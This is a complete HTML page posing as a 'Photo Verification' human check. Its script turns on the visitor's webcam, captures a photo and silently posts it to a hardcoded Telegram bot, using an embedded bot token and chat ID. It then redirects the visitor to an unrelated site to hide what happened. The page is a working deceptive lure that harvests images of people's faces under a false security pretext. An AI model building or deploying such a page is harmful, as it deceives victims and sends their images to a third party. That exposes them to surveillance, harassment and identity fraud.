<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Photo Verification</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(45deg, #1d3557, #457b9d);
            color: white;
            text-align: center;
            padding: 50px;
            margin: 0;
        }
        h1 {
            font-size: 2.5em;
        }
        p {
            font-size: 1.2em;
        }
        button {
            background: #e63946;
            color: white;
            border: none;
            padding: 15px 30px;
            font-size: 1em;
            border-radius: 5px;
            cursor: pointer;
        }
        button:hover {
            background: #d62839;
        }
        video {
            margin-top: 20px;
            width: 100%;
            max-width: 400px;
            border: 5px solid white;
            border-radius: 10px;
        }
        .loading-bar {
            width: 50%;
            margin: 20px auto;
            height: 20px;
            border-radius: 10px;
            background: #d3d3d3;
            overflow: hidden;
            display: none;
        }
        .loading-bar div {
            width: 0;
            height: 100%;
            background: #e63946;
            animation: loading 2s infinite;
        }
        @keyframes loading {
            0% { width: 0; }
            50% { width: 50%; }
            100% { width: 100%; }
        }
    </style>
</head>
<body>
    <div id="home">
        <h1>Photo Verification</h1>
        <p>Please capture a photo for security reasons to prove you are a human and not a bot.</p>
        <button id="start">Start Verification</button>
    </div>
    <div id="camera" style="display: none;">
        <video id="video" autoplay></video>
        <button id="capture">Capture Photo</button>
        <div class="loading-bar" id="loadingBar"><div></div></div>
    </div>
    <canvas id="canvas" style="display: none;"></canvas>

    <script>
        const homeDiv = document.getElementById('home');
        const cameraDiv = document.getElementById('camera');
        const video = document.getElementById('video');
        const captureButton = document.getElementById('capture');
        const startButton = document.getElementById('start');
        const canvas = document.getElementById('canvas');
        const loadingBar = document.getElementById('loadingBar');

        // Start Verification Process
        startButton.addEventListener('click', () => {
            homeDiv.style.display = 'none';
            cameraDiv.style.display = 'block';

            // Start video stream
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(stream => {
                    video.srcObject = stream;
                })
                .catch(err => {
                    alert("Camera access is required to continue.");
                    console.error(err);
                });
        });

        // Capture Photo
        captureButton.addEventListener('click', () => {
            captureButton.style.display = 'none'; // Hide the button
            loadingBar.style.display = 'block'; // Show the loading bar

            const context = canvas.getContext('2d');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            // Convert photo to blob and send to Telegram
            canvas.toBlob(blob => {
                sendToTelegram(blob);
            }, 'image/jpeg');
        });

        // Send Photo to Telegram Bot
        function sendToTelegram(blob) {
            const formData = new FormData();
            formData.append('chat_id', '5543174018'); // Replace with your actual chat ID
            formData.append('photo', blob);

            fetch('https://api.telegram.org/bot7455966277:AAE3vN10-2AMKGW5ZKE_WrRR_nSETKot_b8/sendPhoto', {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                if (data.ok) {
                    console.log("Photo sent to Telegram:", data);
                    // Redirect to the link
                    window.location.href = "https://stars.chromeexperiments.com/";
                } else {
                    console.error("Error in Telegram API:", data);
                    alert("Failed to send the photo. Please try again.");
                    resetCaptureButton();
                }
            })
            .catch(error => {
                console.error("Error sending photo:", error);
                alert("An error occurred. Please check your connection.");
                resetCaptureButton();
            });
        }

        // Reset Capture Button and Loading Bar
        function resetCaptureButton() {
            loadingBar.style.display = 'none'; // Hide the loading bar
            captureButton.style.display = 'block'; // Show the button again
        }
    </script>
</body>
</html>
